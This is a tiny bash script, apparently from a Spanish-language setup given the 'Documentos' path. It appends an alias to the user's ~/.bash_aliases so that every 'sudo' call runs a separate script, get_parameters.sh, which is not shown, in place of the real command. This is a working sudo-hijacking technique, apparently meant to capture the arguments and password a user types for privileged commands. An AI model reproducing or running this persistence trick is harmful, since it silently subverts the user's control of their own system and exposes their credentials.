#!/bin/bash


function to_exec() {

	aliasfile=$(locate .bash_aliases)
	noaliasfile=$(locate .bashrc)

	echo "alias sudo='bash /home/$USER/Documentos/linux/get_parameters.sh'" >> /home/$USER/.bash_aliases
}


to_exec
